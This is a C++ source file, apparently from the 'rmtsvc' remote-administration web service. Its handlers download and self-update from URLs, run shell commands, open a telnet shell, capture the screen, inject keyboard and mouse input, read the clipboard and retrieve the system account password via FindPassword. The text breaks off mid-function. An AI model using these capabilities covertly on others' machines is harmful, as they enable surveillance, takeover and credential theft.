/*******************************************************************
   *	webAction.cpp web请求处理
   *    DESCRIPTION:
   *
   *    AUTHOR:yyc
   *
   *    HISTORY:
   *
   *    DATE:
   *	
   *******************************************************************/

#include "rmtsvc.h"
#include "shellCommandEx.h"
#include "other\wutils.h"
#include "other\ipf.h"

void downThreadX(char *strParam)
{
	if(strParam==NULL) return;
	bool bUpdate=false; std::string strURL;
	if(strParam[0]!='*') strURL.assign(strParam);
	else{ strURL.assign(strParam+1); bUpdate=true; }

	int iType=0; const char *strurl=strURL.c_str();
	if(strncasecmp(strurl,"http://",7)==0) iType=1;
	else if(strncasecmp(strurl,"https://",8)==0) iType=1;
	else if(strncasecmp(strurl,"ftp://",6)==0) iType=2;
	delete[] strParam; if(iType==0) return;
	
	std::string strSaveas,strOutput; clsOutput sout;
	const char *ptr=strchr(strurl,' ');
	if( ptr ){ *(char *)ptr=0; ptr+=1;
		while(*ptr==' ') ptr++; strSaveas.assign(ptr); 
	}
	if(strSaveas==""){ if( (ptr=strrchr(strurl,'/')) ) strSaveas.assign(ptr+1); }
	if(strSaveas[0]!='\\' && strSaveas[1]!=':') strSaveas.insert(0,g_savepath);
	if(bUpdate) strSaveas.append(".upd"); //防止下载的文件和要升级的程序重名
	BOOL bRet=(iType==2)?downfile_ftp(strurl,strSaveas.c_str(),sout):
							 downfile_http(strurl,strSaveas.c_str(),sout);
	if(bRet && bUpdate)  updateRV(strSaveas.c_str(),strOutput);
}
bool webServer :: httprsp_docommandEx(socketTCP *psock,httpResponse &httprsp,const char *strCommand)
{
	if(strCommand==NULL) return false;
	while(*strCommand==' ') strCommand++; //去掉空格
	if(*strCommand!='#') 
		return httprsp_file_run(psock,httprsp,strCommand);
	//否则处理扩展命令
	const char *strCmd=++strCommand;
	const char *strParam=strchr(strCommand,' ');
	if(strParam) { *(char *)strParam=0; strParam++; }

	BOOL bRet=FALSE; std::string strRet; //命令执行返回
	std::string strUpdateFile=""; //rmtsvc本地升级文件
	std::string strDownFile=""; //本地文件下载转向url
	if(strcasecmp(strCmd,"update")==0 || strcasecmp(strCmd,"down")==0) //升级或下载
	{
		strRet="wrong command format!\r\n";
		if(strParam) while(*strParam==' ') strParam++;
		if(strParam && strParam[0]){
			bool bUpdate=(strcasecmp(strCmd,"update")==0);
			if(strstr(strParam,"://")){
				int iLen=strlen(strParam)+8;
				char *downParam=new char[iLen];
				if(downParam){
					if(bUpdate){ downParam[0]='*';
						strcpy(downParam+1,strParam);
					}else strcpy(downParam,strParam);
					if( m_threadpool.addTask((THREAD_CALLBACK *)&downThreadX,(void *)downParam,0)!=0 ){
						strRet.assign("Download from "); strRet.append(strParam);
						strRet.append("\r\n"); bRet=TRUE;
					}else strRet.assign("Failed to start downloa-thread\r\n");
					if(!bRet) delete[] downParam; 
				}else strRet.assign("Failed to start downloa-thread\r\n");
			}else if(!bUpdate)
			{//下载本地指定的文件
				const char *filename,*filepath=NULL;
				const char *ptr=strrchr(strParam,'\\');
				if(ptr){ *(char *)ptr=0;
					filename=ptr+1;
					filepath=strParam;
				} else filename=strParam;
				strDownFile.assign("/download/");
				strDownFile.append(filename);
				strDownFile.append("?path=");
				if(filepath) strDownFile.append(filepath);
			}else{ //用指定的本地文件升级rmtsvc
				strUpdateFile.assign(strParam);
				strRet.assign("Update program...\r\n");
				strRet.append(strParam); bRet=TRUE;
			}
		}//?if(strParam && strParam[0])
	}else bRet=doCommandEx(strCmd,strParam,strRet);
	cBuffer buffer(512);
	buffer.len()+=sprintf(buffer.str()+buffer.len(),"<?xml version=\"1.0\" encoding=\"gb2312\" ?><xmlroot>");
	if(strDownFile!="") 
		 buffer.len()+=sprintf(buffer.str()+buffer.len(),"<dwurl>%s</dwurl>",strDownFile.c_str());
	else buffer.len()+=sprintf(buffer.str()+buffer.len(),"<retmsg>%s</retmsg>",strRet.c_str());
	buffer.len()+=sprintf(buffer.str()+buffer.len(),"</xmlroot>");

	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//设置响应内容长度
	httprsp.lContentLength(buffer.len());
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buffer.len(),buffer.str(),-1);
	if(strUpdateFile!="") updateRV(strUpdateFile.c_str(),strRet);
	return (bRet)?true:false;
}
bool webServer :: httprsp_version(socketTCP *psock,httpResponse &httprsp)
{
	char buffer[256]; int len;
	if(m_bAnonymous)
	len=sprintf(buffer,"%s<br>&nbsp;<font color=red>当前为匿名访问，为了安全请从ini中配置访问账号和权限</font>",
				MyService::ServiceVers);
	else len=sprintf(buffer,"%s",MyService::ServiceVers);
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
//	httprsp.set_mimetype(MIMETYPE_TEXT);
	httprsp.AddHeader(string("Content-Type"),string("text/html; charset=gb2312"));
	httprsp.lContentLength(len); //设置响应内容长度
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(len,buffer,-1); 
	return true;
}

bool webServer:: httprsp_telnet(socketTCP *psock,httpResponse &httprsp,long lAccess)
{
	socketTCP telSock; char buf[128]; int iport;
	MyService *psvr=MyService::GetService();
	socketBase *pevent=(psvr)?psvr->GetSockEvent():NULL;
	telSock.setParent(pevent);
	if( (iport=telSock.ListenX(0,FALSE,NULL))>0 )
		 iport=sprintf(buf,"telnet://%s:%d/",psock->getLocalIP(),iport);
	else iport=sprintf(buf,"Failed to start Telnet.");
	
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_TEXT);
	//设置响应内容长度
	httprsp.lContentLength(iport); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(iport,buf,-1); psock->Close();
	if(telSock.Accept(HTTP_MAX_RESPTIMEOUT,NULL)<=0) return false;
	cTelnetEx telSvr; telSvr.Attach(&telSock);
	return true;
}

bool webServer::httprsp_login(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
{
	session["user"]=""; session["lAccess"]=""; 
	const char *ptr_user=httpreq.Request("user");
	const char *ptr_pswd=httpreq.Request("pswd");
	const char *ptr_chkcode=httpreq.Request("chkcode");
	const char *ptr_key=httpreq.Request("key");
	if(ptr_user && ptr_pswd && ptr_chkcode)
	{
		if( session["chkcode"]!="" && 
			strcasecmp(session["chkcode"].c_str(),ptr_chkcode)==0)  //yyc modify 2006-09-14 不区分大小写
		{//判断帐号和密码，并的到用户的权限
			::_strlwr((char *)ptr_user); //转化为小写

			std::map<std::string,std::pair<std::string,long> >::iterator it=m_mapUsers.find(ptr_user);
			if(it!=m_mapUsers.end())
			{
				if((*it).second.first==std::string(ptr_pswd))
				{
					session["user"]=(*it).first;
					char tmp[16]; sprintf(tmp,"%d",(*it).second.second);
					session["lAccess"]=string(tmp);
					this->httprsp_Redirect(psock,httprsp,"/");
					return true;
				}
			}
		}//?验证码正确
	}//?if(ptr_user && ptr_pswd && ptr_chkcode)

	return false;
}
//设置仅仅获取指定窗口的屏幕
bool webServer:: httprsp_capWindow(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
{
	const char *ptr; char buf[256];
	int buflen, act=0; POINT pt; RECT rc;
	rc.left=rc.top=0; pt.x=pt.y=0;
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	if(hwnd!=NULL) GetWindowRect(hwnd,&rc);
	
	if( (ptr=httpreq.Request("act")) ) act=atoi(ptr);
	if( (ptr=httpreq.Request("x")) ) pt.x=atoi(ptr);
	if( (ptr=httpreq.Request("y")) ) pt.y=atoi(ptr);
	pt.x+=rc.left; pt.y+=rc.top;
	
	if(act==1) //捕获指定的窗口
	{
		hwnd=WindowFromPoint(pt);
		sprintf(buf,"%d",hwnd);
		session["cap_hwnd"]=buf;
	}else if(act==2){ //捕获整个屏幕
		hwnd=NULL;
		session["cap_hwnd"]=string("null");
	} //否则仅仅获取状态
	
	if(hwnd==NULL)
		buflen=sprintf(buf,"hwnd is null");
	else buflen=GetWindowText(hwnd,buf,128);
	std::string s(buf);
	buflen=sprintf(buf,"<?xml version=\"1.0\" encoding=\"gb2312\" ?>\r\n"
				"<xmlroot>\r\n"
				"<hwnd>%d</hwnd>\r\n"
				"<wtext>%s</wtext>\r\n"
				"</xmlroot>",hwnd,s.c_str());

	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//设置响应内容长度
	httprsp.lContentLength(buflen); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buflen,buf,-1);
	return true;
}

//获取设置图像质量 bSetting - 是否可以设置
//获取当前登录用户和权限
bool webServer:: httprsp_capSetting(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp
									,httpSession &session,bool bSetting)
{
	const char *ptr; char buf[1024];
	if(bSetting &&  (ptr=httpreq.Request("quality")) )
	{	
		m_quality=atol(ptr);
		if(m_quality<1 || m_quality>100) m_quality=60;
	}
//	if(bSetting && (ptr=httpreq.Request("lockmskb")) )
//		SetMouseKeybHook( (atol(ptr)==1) );

	if(bSetting && (ptr=httpreq.Request("imgsize")) )
		m_dwImgSize=(DWORD)atol(ptr);
	
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	int buflen=sprintf(buf,"<xmlroot>\r\n"
				"<userAgent><![CDATA[%s]]></userAgent>\r\n"
				"<quality>%d</quality>\r\n"
				"<imgsize>%d</imgsize>\r\n"
				"<qx>%s</qx>\r\n"
				"<ssid>%s</ssid>\r\n"
				"<lockmskb>%d</lockmskb>\r\n"
				"<hwnd>%d</hwnd>\r\n"
				"</xmlroot>",httpreq.Header("User-Agent"),
				m_quality,((m_dwImgSize==0)?0:1),session["lAccess"].c_str(),
				session.sessionID(),0, hwnd);
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//设置响应内容长度
	httprsp.lContentLength(buflen); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buflen,buf,-1);
	return true;
}

bool webServer :: httprsp_msevent(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
{
	int x=0,y=0,dragx=0,dragy=0;
	long dwData=0; short flag=0;
	const char *ptr;
	if( (ptr=httpreq.Request("x")) )
		x=atoi(ptr);
	if( (ptr=httpreq.Request("y")) )
		y=atoi(ptr);
	if( (ptr=httpreq.Request("dragx")) )
		dragx=atoi(ptr);
	if( (ptr=httpreq.Request("dragy")) )
		dragy=atoi(ptr);
	if( (ptr=httpreq.Request("wheel")) )
		dwData=atol(ptr);

	if( (ptr=httpreq.Request("button")) )
		flag=(short)(atoi(ptr) & 0x0f);
	if( (ptr=httpreq.Request("altk")) )
		flag |=(short)(atoi(ptr) & 0x000f)<<8;
	
	RECT rc; rc.left=rc.top=0;
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	if(hwnd!=NULL) GetWindowRect(hwnd,&rc);
	x+=rc.left; y+=rc.top; dragx+=rc.left; dragy+=rc.top;

	if( (ptr=httpreq.Request("act")) )
	{
		short i=(atoi(ptr) & 0x000f);
		if(i==4) //dragdrop
			Wutils::sendMouseEvent(dragx,dragy,(flag |0x0030),0);//先模拟拖动作
		flag |=(i<<4); 
	}
	
	Wutils::sendMouseEvent(x,y,flag,dwData);
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_HTML);
	//设置响应内容长度
	httprsp.lContentLength(0); 
	httprsp.send_rspH(psock,200,"OK"); 
	return true;
}

bool webServer :: httprsp_keyevent(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp)
{
	short vkey=0;
	const char *ptr,*ptr_vkey=httpreq.Request("vkey");
	if(ptr_vkey)
	{
		while( (ptr=strchr(ptr_vkey,',')) )
		{
			*(char *)ptr=0;
			if( (vkey=(short)(atoi(ptr_vkey)& 0xffff))!=0 )
				Wutils::sendKeyEvent(vkey);
			ptr_vkey=ptr+1;
		}//?while
	}//?if(ptr_vkey)

	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_HTML);
	//设置响应内容长度
	httprsp.lContentLength(0); 
	httprsp.send_rspH(psock,200,"OK"); 
	return true;
}

bool webServer :: httprsp_command(socketTCP *psock,httpResponse &httprsp,const char *ptrCmd)
{
	if(ptrCmd)
	{
		if(strcmp(ptrCmd,"CtAlDe")==0) 
			Wutils::SimulateCtrlAltDel();
		else if(strcmp(ptrCmd,"ShDw")==0)
			Wutils::ShutDown();
		else if(strcmp(ptrCmd,"ReSt")==0)
			Wutils::Restart();
		else if(strcmp(ptrCmd,"Lock")==0)
			Wutils::LockWorkstation();
		else if(strcmp(ptrCmd,"LgOf")==0)
			Wutils::Logoff();
	}
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_HTML);
	//设置响应内容长度
	httprsp.lContentLength(0); 
	httprsp.send_rspH(psock,200,"OK"); 
	return true;
}

bool webServer :: httprsp_cmdpage(socketTCP *psock,httpResponse &httprsp,const char *ptrCmd)
{
	MyService *psvr=MyService::GetService();
	std::string strBuffer;
	if(psvr && psvr->m_preCmdpage!="")
		strBuffer=string("\"")+psvr->m_preCmdpage+string("\" ");
	if(ptrCmd) strBuffer.append(ptrCmd);

	docmd_exec2buf(strBuffer,true,5); 
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_TEXT);
	//设置响应内容长度
	httprsp.lContentLength(strBuffer.length()); 
	httprsp.send_rspH(psock,200,"OK"); 
	if(strBuffer!="") psock->Send(strBuffer.length(),strBuffer.c_str(),-1);
	return true;
}

bool webServer :: httprsp_GetClipBoard(socketTCP *psock,httpResponse &httprsp)
{
	std::string strContent;
	Wutils::selectDesktop();
	if(IsClipboardFormatAvailable(CF_TEXT))
	{
		if(OpenClipboard(NULL))
		{
			HGLOBAL hglb = GetClipboardData(CF_TEXT);
			if (hglb != NULL)
			{
				LPTSTR lptstr=(LPTSTR)GlobalLock(hglb);
				if(lptstr!=NULL) strContent.assign(lptstr);
				GlobalUnlock(hglb);
			}
			CloseClipboard();
		}
	}//?if(IsClipboardForma...
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_TEXT);
	//设置响应内容长度
	httprsp.lContentLength(strContent.length()); 
	httprsp.send_rspH(psock,200,"OK");
	if(strContent!="") psock->Send(strContent.length(),strContent.c_str(),-1);
	return true;
}
bool webServer :: httprsp_SetClipBoard(socketTCP *psock,httpResponse &httprsp,const char *strval)
{
	std::string strContent;
	Wutils::selectDesktop();
	if(strval && OpenClipboard(NULL))
	{
		if (::EmptyClipboard())// 清空剪贴板
		{	
			size_t len=strlen(strval);// 分配内存块
			HANDLE hMem= ::GlobalAlloc(GMEM_MOVEABLE|GMEM_DDESHARE, len+1);
			if (hMem)
			{
				LPSTR lpMem = (LPSTR)::GlobalLock(hMem);
				if (lpMem)
				{
					::memcpy((void*)lpMem, (const void*)strval, len+1);
					::SetClipboardData(CF_TEXT,hMem);	
				}//?if (lpMem)
				::GlobalUnlock(hMem);
			}//?hMem
		}
		CloseClipboard();
	}//?if(OpenClipboard(NULL))
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_TEXT);
	//设置响应内容长度
	httprsp.lContentLength(0); 
	httprsp.send_rspH(psock,200,"OK");
	return true;
}

DWORD capDesktop(HWND hWnd,WORD w,WORD h,bool ifCapCursor,long quality,LPBYTE &lpbits);
bool webServer:: httprsp_capDesktop(socketTCP *psock,httpResponse &httprsp,httpSession &session)
{
	bool ifCapCursor=true;
	WORD w=LOWORD(m_dwImgSize);
	WORD h=HIWORD(m_dwImgSize);
	LPBYTE lpbits=NULL;
	Wutils::selectDesktop();
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	DWORD dwRet=capDesktop(hwnd,w,h,ifCapCursor,m_quality,lpbits);
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_JPG);
	//设置响应内容长度
	httprsp.lContentLength(dwRet); 
	httprsp.send_rspH(psock,200,"OK");
	if(lpbits)
	{
		psock->Send(dwRet,(const char *)lpbits,-1);
		::free(lpbits); 
	}
	return true;
}

bool webServer::httprsp_sysinfo(socketTCP *psock,httpResponse &httprsp)
{
	char buf[512]; int buflen=0;
	buflen=sprintf(buf,"<xmlroot>\r\n");
	buflen+=sprintf(buf+buflen,"<pcname>%s</pcname>\r\n",Wutils::computeName());
	MSOSTYPE ostype=Wutils::winOsType(); //系统类型
	buflen+=sprintf(buf+buflen,"<OS>%s</OS>\r\n",Wutils::getLastInfo());
	Wutils::cpuInfo(ostype);//cpu信息
	buflen+=sprintf(buf+buflen,"<CPU>%s</CPU>\r\n",Wutils::getLastInfo());
	Wutils::winOsStatus();//当前系统状态
	buflen+=sprintf(buf+buflen,"<status>%s</status>\r\n",Wutils::getLastInfo());
	Wutils::FindPassword(NULL);//当前系统帐号/密码
	buflen+=sprintf(buf+buflen,"<account>%s</account>\r\n",Wutils::getLastInfo());
	//当前进程ID
	buflen+=sprintf(buf+buflen,"<pid>%d</pid>\r\n",::GetCurrentProcessId());
	buflen+=sprintf(buf+buflen,"</xmlroot>");
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//设置响应内容长度
	httprsp.lContentLength(buflen); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buflen,buf,-1);
	return true;
}

//生成数字校验码图片
DWORD chkcodeImage(LPBITMAPINFOHEADER lpbih,LPBYTE lpbits,const  char *chkcode);
bool webServer::httprsp_checkcode(socketTCP *psock,httpResponse &httprsp,httpSession &session)
{
	//生成5位校验码，并写入session
	char tmpBuf[8]; srand(time(NULL));
	tmpBuf[5]=0;//生成随机数
	for(int i = 0;   i < 5;i++ )
	{
		 char c=(char)((rand()*30)/RAND_MAX);
		 if(c<10) c+=48; else c+=55; //0~9 'A' - 'K'
		 tmpBuf[i]=c;
	}
	session["chkcode"]=tmpBuf;
	//生成图片,并发送
	BITMAPINFOHEADER bih;
	::memset(&bih,0,sizeof(BITMAPINFOHEADER));
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biWidth = 50;
	bih.biHeight = 20;
	bih.biPlanes = 1;
	bih.biBitCount = 24;
	bih.biCompression = BI_RGB;
	bih.biSizeImage =bih.biHeight *DIBSCANLINE_WIDTHBYTES(bih.biWidth *bih.biBitCount );
	LPBYTE lpbits=new BYTE[bih.biSizeImage];
	DWORD dwret=chkcodeImage(&bih,lpbits,tmpBuf);
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_JPG);
	//设置响应内容长度
	httprsp.lContentLength(dwret); 
	httprsp.send_rspH(psock,200,"OK");
	if(dwret>0) psock->Send(dwret,(const char *)lpbits,-1);
	delete[] lpbits; return true;
}

DWORD usageImage(LPBITMAPINFOHEADER lpbih,LPBYTE lpbits);
bool webServer::httprsp_usageimage(socketTCP *psock,httpResponse &httprsp)
{
	BITMAPINFOHEADER bih;
	::memset(&bih,0,sizeof(BITMAPINFOHEADER));
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biWidth = 200;
	bih.biHeight = 80;
	bih.biPlanes = 1;
	bih.biBitCount = 24;
	bih.biCompression = BI_RGB;
	bih.biSizeImage =bih.biHeight *DIBSCANLINE_WIDTHBYTES(bih.biWidth *bih.biBitCount );
	LPBYTE lpbits=new BYTE[bih.biSizeImage];
	DWORD dwret=usageImage(&bih,lpbits);
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_JPG);
	//设置响应内容长度
	httprsp.lContentLength(dwret); 
	httprsp.send_rspH(psock,200,"OK");
	if(dwret>0) psock->Send(dwret,(const char *)lpbits,-1);
	delete[] lpbits; return true;
}

//---------------------------------------------------------------------
//---------------------------------------------------------------------
//生成校验码图片
DWORD chkcodeImage(LPBITMAPINFOHEADER lpbih,LPBYTE lpbits,const  char *chkcode)
{
	if(lpbits==NULL || lpbih==NULL || chkcode==NULL) return 0;
	HDC hWndDC = ::GetWindowDC(NULL);
	HDC hMemDC = ::CreateCompatibleDC(hWndDC);
	HBITMAP hMemBmp = ::CreateCompatibleBitmap(hWndDC, lpbih->biWidth , lpbih->biHeight);
	HBITMAP hOldBmp = (HBITMAP)::SelectObject(hMemDC, hMemBmp);

	RECT rt={0,0,0,0}; rt.right=lpbih->biWidth; rt.bottom=lpbih->biHeight;
	HBRUSH hbr=::CreateSolidBrush(0x0);//创建黑色刷子
	::FillRect(hMemDC,&rt,hbr);//背景为黑色
	::DeleteObject(hbr);
	
	int oldMode=::SetBkMode(hMemDC,TRANSPARENT);
	COLORREF oldColor=::SetTextColor(hMemDC,0x00ffffff);
	rt.top=2;rt.left=2;
	::DrawText(hMemDC,chkcode,strlen(chkcode),&rt,DT_TOP|DT_LEFT);
	//恢复
	::SetBkMode(hMemDC,oldMode);
	::SetTextColor(hMemDC,oldColor);
	
	//获取图像数据并进行jpg压缩
	DWORD dwret=0;
	if(::GetDIBits(hMemDC,hMemBmp,0,lpbih->biHeight,lpbits,(LPBITMAPINFO)lpbih,DIB_RGB_COLORS))
		dwret=cImageF::IPF_EncodeJPEG(lpbih,lpbits,lpbits,60); //进行jpeg压缩

	::DeleteObject(hMemBmp);
	::SelectObject(hMemDC, hOldBmp);	
	::DeleteDC(hMemDC);
	::ReleaseDC(NULL, hWndDC);
	return dwret;
}

//生成cpu占用率和内存使用率图像，并返回图像数据可大小
DWORD usageImage(LPBITMAPINFOHEADER lpbih,LPBYTE lpbits)
{
	#define POINTNUM 20 //每条曲线的点个数
	static int cpuLinePoint[POINTNUM]={0}; //绘制cpu曲线的点
	static int memLinePoint[POINTNUM]={0}; //绘制mem曲线的点
	static int pointStart=0;//第一个点存储的位置
	static int pointEnd=0;//下一个点的存储位置
	
	if(lpbits==NULL || lpbih==NULL) return 0;
	int i,STEPWIDTH=lpbih->biWidth/POINTNUM;
	HDC hWndDC = ::GetWindowDC(NULL);
	HDC hMemDC = ::CreateCompatibleDC(hWndDC);
	RECT rt; rt.left =rt.top=0;
	rt.right =lpbih->biWidth; rt.bottom =lpbih->biHeight;
	HBITMAP hMemBmp = ::CreateCompatibleBitmap(hWndDC, rt.right -rt.left , rt.bottom -rt.top );
	HBITMAP hOldBmp = (HBITMAP)::SelectObject(hMemDC, hMemBmp);
	
	HBRUSH hbr=::CreateSolidBrush(0x0);//创建黑色刷子
	::FillRect(hMemDC,&rt,hbr);//背景为黑色
	::DeleteObject(hbr);
	//绘出网格线
	HPEN hpen=::CreatePen(PS_SOLID,1,0x004040);
	HPEN hOldpen=(HPEN)::SelectObject(hMemDC,hpen);
	for(i=rt.left+STEPWIDTH;i<rt.right;i+=STEPWIDTH)
	{
		::MoveToEx(hMemDC,i,rt.top,NULL);
		::LineTo(hMemDC,i,rt.bottom);
	}
	for(i=rt.top+STEPWIDTH;i<rt.bottom ;i+=STEPWIDTH)
	{
		::MoveToEx(hMemDC,rt.left,i,NULL);
		::LineTo(hMemDC,rt.right,i);
	}
	::SelectObject(hMemDC, hOldpen);
	::DeleteObject(hpen);
	//获取当前cpu占用率和内存使用率数据
	//***********start*****************
	if(pointEnd>0 && (pointEnd%POINTNUM)==(pointStart%POINTNUM)) pointStart+=1;
	cpuLinePoint[pointEnd%POINTNUM]=Wutils::getCPUusage();
	memLinePoint[pointEnd%POINTNUM]=Wutils::getMEMusage();
	pointEnd+=1;
	//***********end*******************
	//绘制cpu占用率曲线－－green line
	hpen=::CreatePen(PS_SOLID,1,0x00ff00);
	hOldpen=(HPEN)::SelectObject(hMemDC,hpen);
	int j=0,hg=rt.bottom -rt.top ;
	::MoveToEx(hMemDC,j*STEPWIDTH,rt.bottom-(cpuLinePoint[pointStart%POINTNUM]*hg)/100,NULL);
	for(i=pointStart+1;i<pointEnd;i++,j++)
		::LineTo(hMemDC,(j+1)*STEPWIDTH,rt.bottom-(cpuLinePoint[i%POINTNUM]*hg)/100);
	::SelectObject(hMemDC, hOldpen);
	::DeleteObject(hpen);
	j=0;//绘制mem使用率曲线－－yellow line
	hpen=::CreatePen(PS_SOLID,1,0x00ffff);
	hOldpen=(HPEN)::SelectObject(hMemDC,hpen);
	::MoveToEx(hMemDC,j*STEPWIDTH,rt.bottom-(memLinePoint[pointStart%POINTNUM]*hg)/100,NULL);
	for(i=pointStart+1;i<pointEnd;i++,j++)
		::LineTo(hMemDC,(j+1)*STEPWIDTH,rt.bottom-(memLinePoint[i%POINTNUM]*hg)/100);
	::SelectObject(hMemDC, hOldpen);
	::DeleteObject(hpen);
	
	//获取图像数据并进行jpg压缩
	DWORD dwret=0;
	if(::GetDIBits(hMemDC,hMemBmp,0,lpbih->biHeight,lpbits,(LPBITMAPINFO)lpbih,DIB_RGB_COLORS))
		dwret=cImageF::IPF_EncodeJPEG(lpbih,lpbits,lpbits,60); //进行jpeg压缩

	::DeleteObject(hMemBmp);
	::SelectObject(hMemDC, hOldBmp);	
	::DeleteDC(hMemDC);
	::ReleaseDC(NULL, hWndDC);
	return dwret;
}

DWORD capDesktop(HWND hWnd,WORD w,WORD h,bool ifCapCursor,long quality,LPBYTE &lpbits)
{
//	static LPBYTE lpbuffer=NULL;
//	static DWORD dwbuffer_size=0;
	LPBYTE lpbuffer=NULL;
	DWORD dwbuffer_size=0;
	BITMAPINFOHEADER bih;
	RECT rect;//得到屏幕的大小
	if(hWnd==NULL) hWnd = ::GetDesktopWindow(); //获取桌面句柄
	::GetWindowRect(hWnd, &rect); //::GetClientRect(hWnd, &rect);
	::memset((void *)&bih,0,sizeof(bih));
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biPlanes = 1;
	bih.biCompression =BI_RGB;
	bih.biBitCount =24;
	bih.biHeight =rect.bottom - rect.top ;
	bih.biWidth =rect.right - rect.left;
	bih.biSizeImage =DIBSCANLINE_WIDTHBYTES(bih.biWidth *bih.biBitCount ) * bih.biHeight ;
	if(bih.biSizeImage>dwbuffer_size)
	{
		if(lpbuffer) ::free(lpbuffer);
		dwbuffer_size=bih.biSizeImage;
		if( (lpbuffer=(LPBYTE)::malloc(dwbuffer_size))==NULL) { dwbuffer_size=0; return 0; }
	}
	
	DWORD dwret=0;
	HDC hWndDC = NULL;
	HDC hMemDC = NULL;
	HBITMAP hMemBmp = NULL;
	HBITMAP hOldBmp = NULL;
	hWndDC = ::GetDCEx(hWnd,NULL,DCX_WINDOW); //::GetDC(hWnd);
	hMemDC = ::CreateCompatibleDC(hWndDC);
	hMemBmp = ::CreateCompatibleBitmap(hWndDC, bih.biWidth, bih.biHeight);
	hOldBmp = (HBITMAP)::SelectObject(hMemDC, hMemBmp);
	::BitBlt(hMemDC, 0, 0, bih.biWidth, bih.biHeight, hWndDC, 0, 0, SRCCOPY);
	
	if(ifCapCursor) //捕获鼠标光标
	{
		POINT ptCursor;
		::GetCursorPos(&ptCursor);
		//先获得鼠标光标下的窗口句柄，得到该窗口的线程ID
		//Attatch当前线程到指定的窗口线程
		//获得该窗口当前鼠标光标句柄
		//Deattach
		//!!!如果不这样做，直接调用GetCursor()则总是获得当前线程的光标句柄
		//如果没有设置则获得的总是漏斗光标句柄
		HWND hw=::WindowFromPoint(ptCursor);
		if(hw==NULL) hw=hWnd;
		DWORD hdl=::GetWindowThreadProcessId(hw,NULL);
		::AttachThreadInput(::GetCurrentThreadId(),hdl,TRUE);
		HCURSOR hCursor=::GetCursor();
		::AttachThreadInput(::GetCurrentThreadId(),hdl,FALSE);
		ICONINFO IconInfo;//获取光标的图标数据 
		if (::GetIconInfo(hCursor, &IconInfo))
		{
			ptCursor.x -= ((int) IconInfo.xHotspot);
			ptCursor.y -= ((int) IconInfo.yHotspot);
		}
		//在兼容设备描述表上画出该光标
		::DrawIconEx(
		hMemDC, // handle to device context 
		ptCursor.x, ptCursor.y,
		hCursor, // handle to icon to draw 
		0,0, // width of the icon 
		0, // index of frame in animated cursor 
		NULL, // handle to background brush 
		DI_NORMAL | DI_COMPAT // icon-drawing flags 
		); 
	}//?if(ifCapCursor) //捕获鼠标光标
	
	if(::GetDIBits(hWndDC,hMemBmp,0,bih.biHeight,lpbuffer,(LPBITMAPINFO)&bih,DIB_RGB_COLORS))
	{
		//进行图像缩小
		if(w!=0 && h!=0)
		{
			float f=(float)bih.biWidth/bih.biHeight;
			float f1=(float)w/h;
			if(f1>f) w=h*f; else h=w/f;
			if(w<bih.biWidth && h<bih.biHeight) //进行图像缩小
			{
				long lEffwidth_src=bih.biSizeImage/bih.biHeight;
				long x,y,lEffwidth_dst=w*3;
				float fX=(float)bih.biWidth/w;
				float fY=(float)bih.biHeight/h;
				LPBYTE ptr,ptrS,ptrD=lpbuffer;
				for(int i=0;i<h;i++)
				{
					ptr=ptrD;
					for(int j=0;j<w;j++)
					{
						//计算该象素在原图像中的坐标
						x=(long)(fX*j); y=(long)(fY*i);
						ptrS = lpbuffer + y * lEffwidth_src + x * 3;
						*ptr++=*ptrS;
						*ptr++=*(ptrS+1);
						*ptr++=*(ptrS+2);
					}
					ptrD+=lEffwidth_dst;
				}
				bih.biWidth=w; bih.biHeight=h;
				bih.biSizeImage=lEffwidth_dst*h;
			}//?if(w<bih.biWidth && h<bih.biHeight)
		}//?if(w!=0 && h!=0)
		//进行jpeg压缩
